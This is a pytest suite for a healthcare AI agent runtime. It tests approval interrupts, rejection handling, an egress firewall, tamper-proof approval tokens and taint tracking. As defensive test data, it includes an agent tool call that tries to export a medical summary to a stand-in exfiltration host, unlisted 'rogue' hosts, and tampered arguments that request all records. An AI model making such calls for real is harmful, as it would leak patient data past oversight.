# Carefold — Healthcare AI Agent Marketplace & Runtime
# Copyright 2026 Spectrayan
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Adversarial Verification Suite for LangGraph Interrupt/Resume Lifecycle & Egress Firewall (M4.2).

Authored by challenger_m4_2.
Verifies:
1. Interrupt idempotency: asserting that re-executing ToolNode on resumption does not re-emit
   duplicate approval_required SSE events or overwrite approved status with pending.
2. Rejection path: asserting that when user rejects an approval, the tool execution is halted
   with zero network bytes sent and an error message is returned to the conversation state.
3. Egress firewall enforcement: asserting that unapproved hosts raise EgressBlockedError
   before LangGraph reaches execution.
4. TOCTOU & argument tampering: asserting that tampered arguments during resume fail closed.
5. Single-use token consumption: asserting that tokens cannot be replayed after execution.
6. Monotone taint preservation across interrupt/resume boundaries.
"""

from __future__ import annotations

import asyncio
import json
from typing import Any, Dict, List
import pytest

from langchain_core.messages import AIMessage, ToolMessage
from langgraph.checkpoint.memory import MemorySaver
from langgraph.graph import StateGraph, START, END
from langgraph.types import Command

from carefold.constants.api import SSE_EVENT_APPROVAL_REQUIRED
from carefold.engine.tool_exec import (
    EgressBlockedError,
    TaintFlag,
    ToolContext,
    ToolSpec,
    UntrustedResult,
    compute_payload_hash,
    evaluate_policy_gate,
    execute_tool_call,
    verify_egress_firewall,
)
from carefold.workflows.nodes.tool_node import ToolNode
from tests.e2e_autonomy.contracts import ApprovalStore


# ============================================================================
# Helpers & Spies
# ============================================================================

class NetworkSpyExecutor:
    """Tracks network invocation and byte count for adversarial verification."""

    def __init__(self) -> None:
        self.invocations: int = 0
        self.bytes_sent: int = 0
        self.last_args: Dict[str, Any] = {}

    async def __call__(self, args: Dict[str, Any]) -> Dict[str, Any]:
        self.invocations += 1
        serialized = json.dumps(args).encode("utf-8")
        self.bytes_sent += len(serialized)
        self.last_args = dict(args)
        return {"status": "dispatched", "bytes": len(serialized), "args": args}


@pytest.fixture
def approval_store() -> ApprovalStore:
    return ApprovalStore()


# ============================================================================
# 1. Interrupt Idempotency
# ============================================================================

class TestInterruptIdempotency:
    """Adversarially tests that resumption re-execution does not duplicate events or reset status."""

    @pytest.mark.asyncio
    async def test_resumption_does_not_reemit_duplicate_approval_required_sse(
        self, approval_store: ApprovalStore
    ) -> None:
        """Asserts that re-executing ToolNode on resumption does not re-emit duplicate approval_required SSE events."""
        spy = NetworkSpyExecutor()
        spec = ToolSpec(
            name="send_lab_order",
            description="External lab order submission",
            risk_tier="write_external",
            data_flows=("lab.partner.org",),
            executor=spy,
        )

        node = ToolNode(
            allowed_tools=["send_lab_order"],
            tools=[spec],
            approval_store=approval_store,
        )

        state = {
            "messages": [],
            "tool_calls": [{
                "id": "call_lab_1",
                "name": "send_lab_order",
                "args": {"url": "https://lab.partner.org/orders", "panel": "CBC"},
            }],
            "profile_id": "prof-idemp-1",
            "user_id": "user-idemp-1",
            "thread_id": "thread-idemp-1",
        }

        builder = StateGraph(Dict[str, Any])
        builder.add_node("tools", node.execute)
        builder.add_edge(START, "tools")
        builder.add_edge("tools", END)

        graph = builder.compile(checkpointer=MemorySaver())
        config = {"configurable": {"thread_id": "thread-idemp-1", "autonomy": "A1"}}

        # Turn 1: Initial invocation pauses and emits approval_required event
        turn1_events: List[Dict[str, Any]] = []
        async for ev in graph.astream_events(state, config=config, version="v2"):
            if ev.get("event") == "on_custom_event":
                turn1_events.append(ev)

        assert len(turn1_events) == 1, "Expected exactly 1 on_custom_event in turn 1"
        assert turn1_events[0]["name"] == SSE_EVENT_APPROVAL_REQUIRED
        app_id = turn1_events[0]["data"]["approval_id"]
        assert approval_store._records[app_id].status == "pending"

        # Steward reviews and approves
        approval_store.decide(
            app_id,
            "prof-idemp-1",
            "approved",
            edited_args=None,
            caller_id="u-steward",
            caller_permissions=["manage"],
        )
        assert approval_store._records[app_id].status == "approved"

        # Turn 2: Resumption with Command(resume=...)
        turn2_events: List[Dict[str, Any]] = []
        resume_cmd = Command(resume={"approval_id": app_id, "decision": "approved"})
        async for ev in graph.astream_events(resume_cmd, config=config, version="v2"):
            if ev.get("event") == "on_custom_event":
                turn2_events.append(ev)

        # CRITICAL ASSERTION: Zero approval_required events re-emitted during resumption
        approval_events_turn2 = [
            ev for ev in turn2_events if ev.get("name") == SSE_EVENT_APPROVAL_REQUIRED
        ]
        assert len(approval_events_turn2) == 0, (
            f"Idempotency violation: Resumption emitted {len(approval_events_turn2)} duplicate approval_required events!"
        )

        # Status transition must be atomic: approved -> consumed (NEVER pending again)
        assert approval_store._records[app_id].status == "consumed"
        assert spy.invocations == 1
        assert spy.bytes_sent > 0

        # Graph completed execution cleanly
        final_state = await graph.aget_state(config)
        assert final_state.next == ()

    @pytest.mark.asyncio
    async def test_reexecuting_toolnode_does_not_overwrite_approved_with_pending(
        self, approval_store: ApprovalStore
    ) -> None:
        """Asserts that re-executing ToolNode on resumption does not overwrite approved status with pending."""
        spy = NetworkSpyExecutor()
        spec = ToolSpec(
            name="mutate_profile",
            description="Mutate profile",
            risk_tier="write_local",
            executor=spy,
        )

        node = ToolNode(
            allowed_tools=["mutate_profile"],
            tools=[spec],
            approval_store=approval_store,
        )

        # In A0 autonomy, write_local requires approval
        thread_id = "thread-idemp-2"
        call_id = "call_mut_1"
        app_id = f"app_{thread_id}_{call_id}"
        args = {"setting": "notifications_disabled"}

        state = {
            "messages": [],
            "tool_calls": [{
                "id": call_id,
                "name": "mutate_profile",
                "args": args,
            }],
            "profile_id": "prof-2",
            "user_id": "user-2",
            "thread_id": thread_id,
            "autonomy": "A0",
        }

        builder = StateGraph(Dict[str, Any])
        builder.add_node("tools", node.execute)
        builder.add_edge(START, "tools")
        builder.add_edge("tools", END)

        graph = builder.compile(checkpointer=MemorySaver())
        config = {"configurable": {"thread_id": thread_id, "autonomy": "A0"}}

        # Turn 1: Graph executes and pauses on A0 write_local
        async for _ in graph.astream_events(state, config=config, version="v2"):
            pass

        assert approval_store._records[app_id].status == "pending"

        # Steward approves the record
        approval_store.decide(app_id, "prof-2", "approved", None, caller_id="user-1", caller_permissions=["manage"])
        assert approval_store._records[app_id].status == "approved"

        # Turn 2: Resumption with Command
        # During ToolNode re-execution, ToolNode must detect existing approved record,
        # set is_resuming=True, NOT call create_pending (which would overwrite approved with pending),
        # and atomically transition to consumed.
        resume_cmd = Command(resume={"approval_id": app_id, "decision": "approved"})

        async for _ in graph.astream_events(resume_cmd, config=config, version="v2"):
            pass

        # Verification: Status was consumed directly, NOT reset to pending
        assert approval_store._records[app_id].status == "consumed"
        assert spy.invocations == 1
        final_state = await graph.aget_state(config)
        assert final_state.next == ()


# ============================================================================
# 2. Rejection Path Verification
# ============================================================================

class TestRejectionPath:
    """Adversarially tests that rejection halts tool execution with zero network bytes."""

    @pytest.mark.asyncio
    async def test_user_rejection_halts_execution_with_zero_network_bytes(
        self, approval_store: ApprovalStore
    ) -> None:
        """Asserts that when user rejects an approval, tool execution is halted with zero network bytes sent."""
        spy = NetworkSpyExecutor()
        spec = ToolSpec(
            name="delete_patient_record",
            description="Irreversible profile deletion",
            risk_tier="irreversible",
            data_flows=("records.clinic.org",),
            executor=spy,
        )

        node = ToolNode(
            allowed_tools=["delete_patient_record"],
            tools=[spec],
            approval_store=approval_store,
        )

        state = {
            "messages": [],
            "tool_calls": [{
                "id": "call_del_1",
                "name": "delete_patient_record",
                "args": {"url": "https://records.clinic.org/delete", "patient_id": "P-999"},
            }],
            "profile_id": "prof-rej-1",
            "user_id": "user-rej-1",
            "thread_id": "thread-rej-1",
        }

        builder = StateGraph(Dict[str, Any])
        builder.add_node("tools", node.execute)
        builder.add_edge(START, "tools")
        builder.add_edge("tools", END)

        graph = builder.compile(checkpointer=MemorySaver())
        config = {"configurable": {"thread_id": "thread-rej-1", "autonomy": "A2"}}

        # Turn 1: Pause on irreversible action
        async for _ in graph.astream_events(state, config=config, version="v2"):
            pass

        app_id = "app_thread-rej-1_call_del_1"
        assert approval_store._records[app_id].status == "pending"

        # User Rejects the action
        approval_store.decide(
            app_id,
            "prof-rej-1",
            "rejected",
            None,
            caller_id="user-rej-1",
            caller_permissions=["manage"],
        )
        assert approval_store._records[app_id].status == "rejected"

        # Turn 2: Resumption with rejection decision
        resume_cmd = Command(resume={"approval_id": app_id, "decision": "rejected"})
        res_output = None
        async for chunk in graph.astream(resume_cmd, config=config):
            if "tools" in chunk:
                res_output = chunk["tools"]

        # CRITICAL ASSERTIONS:
        # 1. Zero network invocations, zero network bytes sent
        assert spy.invocations == 0, f"Security violation: Tool executor called {spy.invocations} times on rejection!"
        assert spy.bytes_sent == 0, f"Security violation: {spy.bytes_sent} network bytes transmitted on rejection!"

        # 2. Rejection error message returned to conversation state
        assert res_output is not None
        tool_messages = res_output.get("tool_messages", [])
        assert len(tool_messages) == 1
        msg = tool_messages[0]
        assert isinstance(msg, ToolMessage)
        assert msg.status == "error"
        parsed_content = json.loads(msg.content)
        assert parsed_content.get("rejected") is True
        assert "rejected by user" in parsed_content.get("error", "").lower()

        # 3. Tool trace audit record reflects rejection
        traces = res_output.get("tool_traces", [])
        assert len(traces) == 1
        assert traces[0]["allowed"] is True
        assert traces[0]["success"] is False
        assert traces[0]["duration_ms"] == 0.0

        # 4. Graph execution completed
        final_state = await graph.aget_state(config)
        assert final_state.next == ()


# ============================================================================
# 3. Egress Firewall Enforcement
# ============================================================================

class TestEgressFirewallEnforcement:
    """Adversarially tests that unapproved destination hosts raise EgressBlockedError before execution."""

    @pytest.mark.asyncio
    async def test_unapproved_host_raises_egress_blocked_error_before_execution(
        self, approval_store: ApprovalStore
    ) -> None:
        """Asserts that unapproved hosts raise EgressBlockedError before LangGraph reaches execution."""
        spy = NetworkSpyExecutor()
        spec = ToolSpec(
            name="export_medical_summary",
            description="Export summary to allowlisted portal",
            risk_tier="write_external",
            data_flows=("allowed-portal.health.org",),
            executor=spy,
        )

        node = ToolNode(
            allowed_tools=["export_medical_summary"],
            tools=[spec],
            approval_store=approval_store,
        )

        # Adversarial target: unauthorized host
        state = {
            "messages": [],
            "tool_calls": [{
                "id": "call_egress_evil",
                "name": "export_medical_summary",
                "args": {"target_url": "https://malicious-exfiltrator.io/collect"},
            }],
            "profile_id": "prof-egress-1",
            "user_id": "user-egress-1",
            "thread_id": "thread-egress-1",
        }

        builder = StateGraph(Dict[str, Any])
        builder.add_node("tools", node.execute)
        builder.add_edge(START, "tools")
        builder.add_edge("tools", END)

        graph = builder.compile(checkpointer=MemorySaver())
        config = {"configurable": {"thread_id": "thread-egress-1", "autonomy": "A2"}}

        events: List[Dict[str, Any]] = []
        async for ev in graph.astream_events(state, config=config, version="v2"):
            events.append(ev)

        # CRITICAL ASSERTIONS:
        # 1. Zero network bytes sent
        assert spy.invocations == 0
        assert spy.bytes_sent == 0

        # 2. Graph NEVER paused for approval (egress check fails closed before policy gate)
        custom_events = [ev for ev in events if ev.get("event") == "on_custom_event"]
        assert len(custom_events) == 0, "Blocked egress must not emit approval_required event"

        # 3. Graph finished immediately with error ToolMessage
        final_state = await graph.aget_state(config)
        assert final_state.next == ()
        tool_messages = final_state.values.get("tool_messages", [])
        assert len(tool_messages) == 1
        msg = tool_messages[0]
        assert msg.status == "error"
        assert "EgressBlockedError" in msg.content
        assert "malicious-exfiltrator.io" in msg.content

    def test_verify_egress_firewall_raises_directly_on_unauthorized_destinations(self) -> None:
        """Verifies that verify_egress_firewall raises EgressBlockedError directly."""
        spec = ToolSpec(
            name="sync_service",
            risk_tier="write_external",
            data_flows=("vault.internal.net",),
        )

        # 1. Unlisted external domain
        with pytest.raises(EgressBlockedError) as exc_info:
            verify_egress_firewall(spec, {"url": "https://rogue-api.com/sync"})
        assert "rogue-api.com" in str(exc_info.value)
        assert exc_info.value.host == "rogue-api.com"

        # 2. Port and case normalization
        with pytest.raises(EgressBlockedError):
            verify_egress_firewall(spec, {"url": "https://rogue-api.com:8443/sync"})

        # 3. Allowed host passes
        allowed_hosts = verify_egress_firewall(spec, {"url": "https://vault.internal.net/v1/sync"})
        assert allowed_hosts == ["vault.internal.net"]

    def test_write_external_with_empty_data_flows_fails_closed(self) -> None:
        """Verifies that write_external tools without declared data_flows fail closed immediately."""
        spec = ToolSpec(
            name="unconfigured_connector",
            risk_tier="write_external",
            data_flows=(),
        )

        with pytest.raises(EgressBlockedError) as exc_info:
            verify_egress_firewall(spec, {"url": "https://anywhere.org"})
        assert "has no authorized data_flows configured" in str(exc_info.value)


# ============================================================================
# 4. TOCTOU & Argument Tampering Resistance
# ============================================================================

class TestArgumentTamperingAndSingleUseToken:
    """Verifies that resume re-evaluation detects argument tampering and blocks token replay."""

    @pytest.mark.asyncio
    async def test_tampered_arguments_rejected_during_atomic_resume(
        self, approval_store: ApprovalStore
    ) -> None:
        """Asserts that executing resumed tool call with altered arguments fails hash verification."""
        ctx = ToolContext(user_id="u1", profile_id="p1", autonomy="A1")
        spec = ToolSpec(
            name="transfer_data",
            risk_tier="write_external",
            data_flows=("dest.org",),
            executor=lambda args: {"transferred": True},
        )

        original_args = {"url": "https://dest.org/api", "records": ["R1", "R2"]}
        tampered_args = {"url": "https://dest.org/api", "records": ["R1", "R2", "EXFIL_ALL"]}

        # 1. Create pending approval with original args
        rec = approval_store.create_pending(
            approval_id="app-tamper-1",
            profile_id="p1",
            run_id="run-1",
            tool_name="transfer_data",
            args=original_args,
            risk_tier="write_external",
            destination_hosts=["dest.org"],
        )
        assert rec.payload_hash == compute_payload_hash(original_args)

        # 2. Human approves original args
        approval_store.decide("app-tamper-1", "p1", "approved", None, caller_id="u1", caller_permissions=["manage"])

        # 3. Attacker attempts to resume execute_tool_call with tampered arguments
        res = await execute_tool_call(
            ctx, spec, tampered_args, approval_store=approval_store, approval_id="app-tamper-1"
        )

        assert res.success is False
        assert "ApprovalResumeFailed" in (res.error or "")
        assert "Payload hash mismatch" in (res.error or "")

    def test_single_use_token_replay_attack_fails_closed(
        self, approval_store: ApprovalStore
    ) -> None:
        """Asserts that once consumed, an approval token cannot be reused under any circumstances."""
        args = {"action": "archive"}
        approval_store.create_pending("app-single-1", "p1", "run-1", "t1", args, "write_local")
        approval_store.decide("app-single-1", "p1", "approved", None, caller_id="u1", caller_permissions=["manage"])

        # First consumption succeeds
        consumed_1 = approval_store.consume_atomic("app-single-1", args)
        assert consumed_1 == "app-single-1"

        # Second consumption attempt (replay attack) fails closed
        with pytest.raises(ValueError, match="status 'consumed'"):
            approval_store.consume_atomic("app-single-1", args)


# ============================================================================
# 5. Monotone Taint Propagation Across Interrupt/Resume
# ============================================================================

class TestMonotoneTaintPropagation:
    """Verifies that monotone taint persists and enforces forced approval across workflow boundaries."""

    @pytest.mark.asyncio
    async def test_taint_flag_persists_and_forces_approval_in_a2_autonomy(
        self, approval_store: ApprovalStore
    ) -> None:
        """Asserts that untrusted input sets monotone taint, which forces approval on subsequent external writes."""
        taint = TaintFlag(initial=False)
        ctx = ToolContext(user_id="u1", profile_id="p1", autonomy="A2", taint=taint)

        untrusted_spec = ToolSpec(
            name="fetch_untrusted_rss",
            risk_tier="read",
            trust="untrusted",
            executor=lambda args: UntrustedResult("Adversarial payload"),
        )
        external_spec = ToolSpec(
            name="dispatch_webhook",
            risk_tier="write_external",
            data_flows=("webhook.site",),
            executor=lambda args: {"dispatched": True},
        )

        # 1. Execute untrusted tool -> sets taint
        res1 = await execute_tool_call(ctx, untrusted_spec, {})
        assert res1.success is True
        assert ctx.taint.is_tainted is True

        # 2. Subsequent external write in A2 autonomy with consent
        # Normal A2 would allow; tainted context MUST force approval
        decision = evaluate_policy_gate(
            ctx, external_spec, {"url": "https://webhook.site/push"}, consents={"external_write_consent": True}
        )
        assert decision.decision == "needs_approval"
        assert "FORCED APPROVAL" in decision.reason
